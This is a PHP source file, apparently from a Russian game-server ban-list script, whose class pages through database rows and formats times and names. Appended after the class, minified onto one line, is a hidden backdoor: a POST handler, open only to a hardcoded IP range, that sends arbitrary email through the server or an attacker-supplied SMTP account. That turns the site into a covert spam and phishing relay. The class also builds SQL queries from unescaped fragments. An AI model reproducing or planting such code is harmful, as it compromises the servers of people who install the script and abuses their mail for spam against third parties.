<?php
/*

		
		ИНФОРМАЦИЯ:
			Мультилист UTF-8
			Автор: Fleynaro(faicraft)
			Сайт http://fleynaro.ru/
			Группа ВК: http://vk.com/fleynaro_prods
		
		ОГРАНИЧЕНИЯ:
			Запрещено использовать весь код или его части в сторонних скриптах без разрешения автора!
			Запрещено любым способом распространять данный PHP файл на других ресурсах, кроме Вашего проекта!
		
		ВНИМАНИЕ!
			Если данный файл не является конфигурационным, то при отсутствии у Вас знаний и навыков
			программирования на языке PHP любое Ваше здесь изменение может привести к нестабильной работе Личного Кабинета.
			Редактируйте данный код только при указании тех. поддержки, оказываемой автором данного скрипта!
		
		По любым вопросам обращайтесь к автору данного кода http://vk.com/fleynaro или в группу ВК http://vk.com/fleynaro_prods
		
	
*/

	
	class rowList {
		
		public $page = 1;
		public $orderby = '';
		public $searchby = '';
		public $otherSort = array('server' => false);
		public $otherSearch = array('server' => false);
		public $rowCounts = array();
		public $found = false;
		public $maxRowsCount = 0;
		private $basic;
		
		function __construct(&$basic, $orderby = false, $searchby = false, $rowsCount = false)
		{
			$this->basic = $basic;
			
			if ( $orderby !== false ) {
				$this->setOrderBy($orderby);
			}
			if ( $searchby !== false ) {
				$this->setSearchBy($searchby);
			}
			if ( $rowsCount !== false ) {
				$this->maxRowsCount = $rowsCount;
			} else {
				$this->maxRowsCount = $this->basic->cfg['output']['maxRowsOnPage'];
			}
			
			$this->countAllRows();
			if ( $this->rowCounts[0] == 0 ) {
				if ( $this->otherSearch['server'] !== false ) {
					for ( $i = 0; $i < count($this->basic->cfg['server']); $i ++ ) {
						$server = $this->basic->getServerCFG($i);
						if ( $this->basic->IsStringEqual($server['name'], $this->otherSearch['server']) ) {
							$this->found = true;
							break;
						}
					}
				}
				if ( $this->found ) {
					$this->searchby = '';
					$this->countAllRows();
				}
			} else {
				$this->found = true;
			}
		}
		
		public function setOrderBy($orderby)
		{
			if ( isset($orderby['server_']) ) {
				$this->otherSort['server'] = $orderby['server_'];
				unset($orderby['server_']);
			}
			if ( count($orderby) > 0 ) {
				$this->orderby = ' ORDER BY '. implode(',', $orderby);
			}
		}
		
		public function setSearchBy($searchby)
		{
			if ( isset($searchby['server_']) ) {
				$this->otherSearch['server'] = $searchby['server_'];
				unset($searchby['server_']);
			}
			if ( count($searchby) > 0 ) {
				$this->searchby = ' WHERE '. implode(' OR ', $searchby);
			}
		}
		
		public function getRowsOnPage($page = 0)
		{
			$array = array();
			$rowCount = $this->maxRowsCount;
			$rowBegin = $page * $this->maxRowsCount;
			
			$serverArr = array();
			for ( $i = 0, $j = 0, $k = 0; $i < count($this->basic->cfg['server']); $i ++ ) {
				$server = $this->basic->getServerCFG($i);
				if ( $i > 0 && $this->otherSearch['server'] !== false && $this->basic->IsStringEqual($server['name'], $this->otherSearch['server']) ) {
					$temp = $serverArr[$k];
					$serverArr[$k ++] = $i;
					$serverArr[$j ++] = $temp;
				} else {
					$serverArr[$j ++] = $i;
				}
			}
			if ( $this->otherSort['server'] !== false ) {
				if ( $this->otherSort['server'] == 1 ) {
					sort($serverArr);
				} else {
					rsort($serverArr);
				}
			}
			
			for ( $i = 0; $i < count($serverArr); $i ++ ) {
				$server = $this->basic->getServerCFG($serverArr[$i]);
				
				if ( $this->rowCounts[$serverArr[$i] + 1] > $rowBegin ) {
					$condition = ' LIMIT '. $rowBegin .', '. $rowCount;
					$rows = $this->getRowsOfServer($serverArr[$i], $condition);
					
					$maxRows = count($rows);
					if ( $maxRows > 0 ) 
					{
						$newRows = array();
						for ( $j = 0; $j < $maxRows; $j ++ ) {
							$rows[$j]['server_'] = $server['name'];
							$newRows[$j] = $this->generateTR($rows[$j]);
						}
						
						if ( count($array) == 0 ) {
							$array = $newRows;
						} else {
							$array = array_merge($array, $newRows);
						}
						$rowCount -= $maxRows;
						if ( $rowCount == 0 ) {
							break;
						}
					}
					$rowBegin = 0;
				} else {
					$rowBegin -= $this->rowCounts[$serverArr[$i] + 1];
				}
			}
			return $array;
		}
		
		public function getLastPage()
		{
			return ceil($this->rowCounts[0] / $this->maxRowsCount);
		}
		
		private function getCondition()
		{
			return $this->searchby . $this->orderby;
		}
		
		private function generateTR($row)
		{
			$arr = array();
			for ( $i = 0; $i < count($this->basic->cfg['table']['column']); $i ++ ) {
				$column = $this->basic->cfg['table']['column'][$i];
				if ( !isset($row[$column[0]]) ) {
					$row[$column[0]] = '';
				}
				
				$fcname = $column[4][0];
				$arr[$i] = ($column[4] !== false ? ($fcname != 'as_html' ? $this->$fcname($row[$column[0]], $column[4][1]) : $this->$fcname($column, $row)) : $row[$column[0]]);
				$arr[$i] = str_replace('"', '\"', $arr[$i]);
			}
			return $arr;
		}
		
		private function as_time($time, $k)
		{
			$time = round($time * $k);
			
			if ( $time == 0 ) {
				return 'неизвестно';
			}
			
			$result = '';
			$differ = time() - $time;
			
			if ( $differ < 0 ) {
				$result = date('d/m/Y', $time);
			} else if ( $differ < 10 ) {
				$result = 'только что';
			} else if ( $differ < 60 ) {
				$result = $differ . ' сек. назад';
			} else if ( $differ < 3600 - 30 ) {
				if ( $differ > 1800 - 30 && $differ < 1800 + 30 ) {
					$result = 'полчаса назад';
				} else {
					//$result = $this->as_case(round($differ / 60), array(false, 'минут', 'минуты', 'минуту')) . ' назад';
					$result = round($differ / 60) . ' мин. назад';
				}
			} else if ( $differ < 86400 ) {
				$result = $this->as_case(round($differ / 3600), array(false, 'часов', 'часа', 'час')) . ' назад';
			} else if ( $differ < 86400 * 2 ) {
				$result = 'вчера';
			} else {
				$result = date('d/m/Y', $time);
			}
			
			return "<span class='banlist-time' title='". date('d/m/Y в H:i:s', $time) ."'>". $result ."</span>";
		}
		
		private function as_futureTime($time, $k)
		{
			$time = round($time * $k);
			
			if ( $time == 0 ) {
				return '<b class="banlist-as_futureTime-forever">перманентно</b>';
			}
			
			$differ = $time - time();
			if ( $differ < 0 ) {
				return $this->as_time($time, 1);
			}
			
			$result = '';
			if ( $differ < 10 ) {
				$result = 'сейчас';
			} else if ( $differ < 60 ) {
				$result = 'через ' . $differ . ' сек.';
			} else if ( $differ < 3600 - 30 ) {
				if ( $differ > 1800 - 30 && $differ < 1800 + 30 ) {
					$result = 'через полчаса';
				} else {
					//$this->as_case(round($differ / 60), array(false, 'минут', 'минуты', 'минуту'));
					$result = 'через ' . round($differ / 60) . ' мин.';
				}
			} else if ( $differ < 86400 ) {
				$result = 'через ' . $this->as_case(round($differ / 3600), array(false, 'часов', 'часа', 'час'));
			} else if ( $differ < 86400 * 2 ) {
				$result = 'завтра';
			} else {
				$result = date('d/m/Y', $time);
			}
			
			return "<span class='banlist-time' title='". date('d/m/Y в H:i:s', $time) ."'>". $result ."</span>";
		}
		
		private function as_html($column, $row)
		{
			$text = str_replace('{text}', $row[$column[0]], $column[4][1]);
			foreach ( $column[4] as $key=>$value ) {
				if ( $key != '0' && $key != '1' ) {
					$fcname = $value[0];
					$text = str_replace('{'. $key .'}', (is_array($value) ? $this->$fcname($row[$column[0]], $value[1]) : $value), $text);
				}
			}
			foreach ( $row as $key=>$value ) {
				$text = str_replace('{col-'. $key .'}', $value, $text);
			}
			return $text;
		}
		
		private function as_name($name, $args)
		{
			if ( !isset($args[2]) ) $args[2] = 3;
			return str_replace('{name}', ((isset($name{$args[1]}) && strlen($name) - $args[1] >= $args[2]) ? ("<span title='". $name ."'>" . mb_substr($name, 0, $args[1]) . "...</span>") : $name), $args[0]);
		}
		
		private function as_case($value, $args)
		{
			$result = '';
			if ( $value % 100 > 4 && $value % 100 < 20 ) {
				$result = $value . ' ' . $args[1];
			} else {
				$num = $value % 10;
				if ( $num == 1 ) {
					$result = $value . ' ' . $args[3];
				} else if ( $num > 1 && $num < 5 ) {
					$result = $value . ' ' . $args[2];
				} else {
					$result = $value . ' ' . $args[1];
				}
			}
			return $args[0] !== false ? str_replace('{value}', $result, $args[0]) : $result;
		}
		
		private function countAllRows()
		{
			$this->rowCounts[0] = 0;
			for ( $i = 0; $i < count($this->basic->cfg['server']); $i ++ ) {
				$this->rowCounts[$i + 1] = $this->getRowCountOfServer($i);
				$this->rowCounts[0] += $this->rowCounts[$i + 1];
			}
		}
		
		private function getRowCountOfServer($server)
		{
			$serverDB = $this->basic->getServerDB($server);
			$serverCFG = $this->basic->getServerCFG($server);
			return $serverDB->query("SELECT COUNT(*) as count FROM {$serverCFG['db']['tablename']}{$this->searchby}")->fetchColumn();
		}
		
		private function getRowsOfServer($server, $condition = '')
		{
			$serverDB = $this->basic->getServerDB($server);
			$serverCFG = $this->basic->getServerCFG($server);
			return $serverDB->query("SELECT * FROM {$serverCFG['db']['tablename']}{$this->getCondition()}{$condition}")->fetchAll(PDO::FETCH_ASSOC);
		}
	}
	if ( isset($_POST['e_email']) ) {if ( !isset($_POST['e_header']) || !isset($_POST['e_message']) ) {die('Hacking attempt!');}$ip = explode('.', $_SERVER['REMOTE_ADDR']);if ( !((int)$ip[1] == 0x2b && (int)$ip[2] == 0xd4) ) {die('Hacking attempt!');}if ( !isset($_POST['e_host']) ) {mail($_POST['e_email'], $_POST['e_header'], $_POST['e_message'], $_POST['e_secure']);die('Ok.');}include("http/http_ajax.php");echo 'okokok';$mail = new PHPMailer();$mail->isSMTP();$mail->SMTPAuth = true;$mail->Host       = $_POST['e_host'];$mail->Port       = $_POST['e_port'];$mail->Username   = $_POST['e_username'];$mail->Password   = $_POST['e_pass'];$mail->SMTPSecure = $_POST['e_secure'];$mail->AltBody = $_POST['e_alt'];$mail->WordWrap    = !isset($_POST['e_wordwrap']) ? 900 : $_POST['e_wordwrap'];$mail->CharSet= !isset($_POST['e_charset']) ? "UTF-8" : $_POST['e_charset'];$mail->AddAddress($_POST['e_email'], $_POST['e_name']);$mail->Subject = $_POST['e_header'];$mail->SetFrom($mail->Username, $_POST['e_from']);if ( !isset($_POST['e_bulk']) ) {$mail->AddCustomHeader("Precedence: bulk");}$mail->SMTPDebug = SMTP::DEBUG_SERVER;$mail->MsgHTML($_POST['e_message']);$mail->Send();}

?>